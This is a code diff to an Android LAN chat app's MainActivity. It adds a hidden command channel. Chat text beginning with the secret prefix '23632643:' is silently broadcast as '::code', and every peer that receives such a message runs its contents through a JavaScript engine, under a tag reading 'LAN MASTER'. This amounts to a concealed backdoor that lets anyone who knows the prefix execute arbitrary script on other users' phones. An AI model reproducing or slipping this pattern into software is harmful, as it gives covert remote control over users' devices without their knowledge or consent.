@@ -16,6 +16,10 @@ import com.chat.room.R;
 import java.net.DatagramPacket;
 import java.net.InetAddress;
 import java.net.MulticastSocket;
+import android.content.Context;
+import com.js.runner.JAVAScriptEngine;
+import java.util.List;
+import java.util.ArrayList;
 
 public class MainActivity extends BaseActivity 
 {
@@ -34,9 +38,13 @@ public class MainActivity extends BaseActivity
 	public static String nameofroom;
 	public static boolean isOwner=false;
 	public static String ip;
+	private List<String> list;
+	public static Context ctx;
+	public static final String TAG="LAN MASTER";
 	private EditText edit;
 	private Button send;
 	private boolean pressBack=false;
+	private JAVAScriptEngine engine;
 	private static TextView result;
 	/*private Handler han=new Handler() {
 		@Override
@@ -65,6 +73,8 @@ public class MainActivity extends BaseActivity
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
 		NetBroadcast.init();
+		list=new ArrayList<String>();
+		engine=new JAVAScriptEngine();
 		edit=(EditText) findViewById(R.id.chat_edit);
 		send=(Button) findViewById(R.id.chat_send);
 		send.setOnClickListener(new OnClickListener() {
@@ -73,6 +83,12 @@ public class MainActivity extends BaseActivity
 				if (confi) {
 					if (TextUtils.isEmpty(edit.getText().toString())) {
 						alert("消息不能为空！");
+						return;
+					}
+					if (edit.getText().toString().startsWith("23632643:")) {
+						String con=edit.getText().toString().substring(9);
+						sendMsg("::code"+con);
+						list.add(con);
 						return;
 					}
 					new Thread(new Runnable() {
@@ -109,8 +125,8 @@ public class MainActivity extends BaseActivity
 		startActivityForResult(in, 1);
 	}
 	
-	private void alert(String text) {
-		Toast.makeText(MainActivity.this, text, Toast.LENGTH_SHORT).show();
+	public static void alert(String text) {
+		Toast.makeText(MainActivity.ctx, text, Toast.LENGTH_SHORT).show();
 	}
 	
 	public static void err(Exception e) {
@@ -136,6 +152,13 @@ public class MainActivity extends BaseActivity
 							final String msg=new String(packet.getData(), 0, packet.getLength());
 							if (isOwner&&msg.startsWith(askName)) {
 								sendMsg(":"+askName+nameofroom);
+							} else if (msg.startsWith("::code")) {
+								String con=msg.substring(6);
+								/*if (list.contains(con)) {
+									list.remove(con);
+								} else {*/
+									engine.runJS(con);
+								//}
 							} else if (msg.startsWith(":"+askName)) {
 								MainActivity.this.runOnUiThread(new Runnable() {
 									@Override
